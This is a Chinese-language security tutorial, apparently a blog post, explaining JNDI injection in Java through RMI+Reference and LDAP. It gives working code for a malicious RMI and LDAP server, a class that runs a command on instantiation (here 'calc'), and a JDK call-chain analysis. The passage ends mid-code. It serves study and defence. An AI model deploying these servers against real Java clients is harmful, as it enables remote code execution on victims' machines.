&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Server</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意:里面while循环的目的是添加一个无限循环或阻塞线程的代码，防止在将对象绑定到JNDI服务上后，执行流程结束退出程序，导致JVM关闭。此代码仅用于测试<br>另外使用 Naming.rebind 创建 RMI 注册表不需要阻塞，因为该方法会一直运行直到 JVM 退出或者 Naming.unexportObject 方法被调用</p>
<p>客户端:通过lookup寻找远程对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person)initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/person&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> p.sayhello();</span><br><span class="line">        System.out.print(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JNDI中服务端的代码还可以是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">        <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL,</span><br><span class="line">        <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br></pre></td></tr></table></figure>

<h2 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h2><p>Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用<br><strong>构造方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 为类名称为 &quot;className &quot;的对象构造一个新引用</span></span><br><span class="line">Reference(String className)</span><br><span class="line"><span class="comment">// 为类名称为 &quot;className &quot;的对象和地址构造一个新引用</span></span><br><span class="line">Reference(String className, RefAddr addr)</span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation)</span><br><span class="line">Reference(String className, String factory, String factoryLocation)</span><br></pre></td></tr></table></figure>

<ul>
<li>className：远程加载时所使用的类名；</li>
<li>classFactory：加载的class中需要实例化类的名称；</li>
<li>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file&#x2F;ftp&#x2F;http等协议；</li>
</ul>
<p><strong>常用方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将地址添加到索引posn的地址列表中</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> posn, RefAddr addr)</span></span><br><span class="line"><span class="comment">// 将地址添加到地址列表的末尾   </span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(RefAddr addr)</span> </span><br><span class="line"><span class="comment">// 从此引用中删除所有地址  </span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> </span><br><span class="line"><span class="comment">// 检索索引posn上的地址 </span></span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line"><span class="comment">// 检索地址类型为addrType的第一个地址 </span></span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(String addrType)</span>   </span><br><span class="line">Enumeration&lt;RefAddr&gt; <span class="title function_">getAll</span><span class="params">()</span> </span><br><span class="line">String <span class="title function_">getClassName</span><span class="params">()</span>  </span><br><span class="line">String <span class="title function_">getFactoryClassLocation</span><span class="params">()</span>  </span><br><span class="line">String <span class="title function_">getFactoryClassName</span><span class="params">()</span>     </span><br><span class="line">Object <span class="title function_">remove</span><span class="params">(<span class="type">int</span> posn)</span>  </span><br><span class="line"><span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>  </span><br><span class="line">String <span class="title function_">toString</span><span class="params">()</span> </span><br></pre></td></tr></table></figure>

<p>其他详情参考:<a href="https://docs.oracle.com/javase/8/docs/api/javax/naming/Reference.html">https://docs.oracle.com/javase/8/docs/api/javax/naming/Reference.html</a></p>
<p><strong>示例</strong><br>环境:java1.8_66<br>服务端:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReferServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建Reference对象</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br><span class="line">        <span class="comment">// 由于Reference类没有继承Remote接口, 所以需要使用ReferenceWrapper进行封装</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;exec&quot;</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>恶意的test类:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用对应的javac版本编译后，使用python开启8080端口的web服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac test.java</span><br><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure>

<p><strong>注</strong>:这里的test.java和test.class千万不要放在和Client同目录，这样会造成test远程对象从CLASSPATH中加载<br>客户端代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReferClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:7777/exec&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>流程:客户端通过lookup()获取远程对象时，获得一个Reference类的存根，由于获得的是一个Reference实例，客户端首先会去CLASSPATH寻找一个被标识为test的类，如果本地没有找到，则会请求<a href="http://localhost:8080/test.class%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%B9%B6%E8%B0%83%E7%94%A8test%E7%9A%84%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E3%80%82">http://localhost:8080/test.class动态加载并调用test的构造函数。</a></p>
<h1 id="JDNI链分析"><a href="#JDNI链分析" class="headerlink" title="JDNI链分析"></a>JDNI链分析</h1><h2 id="RMI-Reference"><a href="#RMI-Reference" class="headerlink" title="RMI+Reference"></a>RMI+Reference</h2><p>针对2.2中的Reference示例进行详细分析，其调用链如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">163</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">decodeObject:<span class="number">464</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">124</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">main:<span class="number">8</span>, ReferClient (JNDI)</span><br></pre></td></tr></table></figure>

<p>InitialContext.lookup函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="comment">// getURLOrDefaultInitCtx函数分析name的协议头并返回对应协议的环境对象，然后在对应协议中调用lookup函数寻找name</span></span><br><span class="line">    <span class="comment">// 上述实验环境中返回的是rmiURLContext对象</span></span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GenericURLContext.lookup函数:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="comment">// 获取指定name的JNDI上下文对象</span></span><br><span class="line">    <span class="type">ResolveResult</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.getRootURLContext(var1, <span class="built_in">this</span>.myEnv);</span><br><span class="line">    <span class="comment">// 获取解析出的JNDI对象，并强制转换成Context类型</span></span><br><span class="line">    <span class="type">Context</span> <span class="variable">var3</span> <span class="operator">=</span> (Context)var2.getResolvedObj();</span><br><span class="line"></span><br><span class="line">    Object var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 调用lookup查询</span></span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        var3.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230716210601.png"><br>RegistryContext.lookup函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 这里的registry其实是Stub，在存根中寻找var1对应的对象</span></span><br><span class="line">            var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果远程注册表中存在var1对应的对象，则调用decodeObject将远程对象转换成本地的Java对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230716211138.png"><br>RegistryContext.decodeObject函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 首先判断var1是否是远程引用，如果是则会与RMI服务器进行一次连接获取远程Class文件的地址，否则不会进行连接</span></span><br><span class="line">        <span class="comment">// 这里是远程引用，根据结果截图可以知道这里得到了远程对象的地址</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="comment">// 将var3转换成本地Java对象</span></span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">        var4.setRootCause(var7);</span><br><span class="line">        <span class="keyword">throw</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230716212307.png"><br>NamingManager.getObjectInstance函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">    <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                        Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ObjectFactory factory;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use builder if installed</span></span><br><span class="line">    <span class="type">ObjectFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> getObjectFactoryBuilder();</span><br><span class="line">    <span class="comment">// 不执行</span></span><br><span class="line">    <span class="keyword">if</span> (builder != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// builder must return non-null factory</span></span><br><span class="line">        factory = builder.createObjectFactory(refInfo, environment);</span><br><span class="line">        <span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,</span><br><span class="line">            environment);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use reference if possible</span></span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 传入的refInfo确实是Reference对象</span></span><br><span class="line">    <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">        ref = (Reference) refInfo;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">        ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object answer;</span><br><span class="line">    <span class="comment">// if条件成立，进入</span></span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line">            <span class="comment">// 注意这里，从引用对象中获取对象工厂 ObjectFactory 的实现类对象</span></span><br><span class="line">            factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                    environment);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">            <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">            <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">            <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">            <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">            answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">            <span class="keyword">if</span> (answer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> answer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try using any specified factories</span></span><br><span class="line">    answer =</span><br><span class="line">        createObjectFromFactories(refInfo, name, nameCtx, environment);</span><br><span class="line">    <span class="keyword">return</span> (answer != <span class="literal">null</span>) ? answer : refInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230716213906.png"><br>NamingManager.getObjectFactoryFromReference函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">    Reference ref, String factoryName)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">    InstantiationException,</span><br><span class="line">    MalformedURLException &#123;</span><br><span class="line">    Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试本地获取class</span></span><br><span class="line">    <span class="comment">// Try to use current class loader</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    <span class="comment">// 从本地的classpath获取失败，尝试从cosebase获取，这里的cosebase即web服务的地址</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 实例化恶意Class文件，触发代码执行</span></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230716214416.png"><br>此时将远程的恶意类实例化，其构造函数在实例化过程中默认执行，进而命令执行然后程序报错退出。<br>防止程序报错退出的方法是让恶意类继承ObjectFactory接口并重写getObjectInstance方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,Hashtable&lt;?,?&gt; environment)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样客户端在命令执行后就能够正常退出程序了<br><strong>详细流程</strong>：参考网上一张详细的图<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230717151417.png"></p>
<h2 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h2><p><strong>LDAP简介</strong>：轻量目录访问协议（Lightweight Directory Access Protocol），基于TCP&#x2F;IP协议，分为服务端和客户端，使用树形存储，用于在分布式环境中访问和管理目录服务<br><strong>示例</strong>：<br>添加依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>服务端：参考marshalsec</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8080/#test&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span 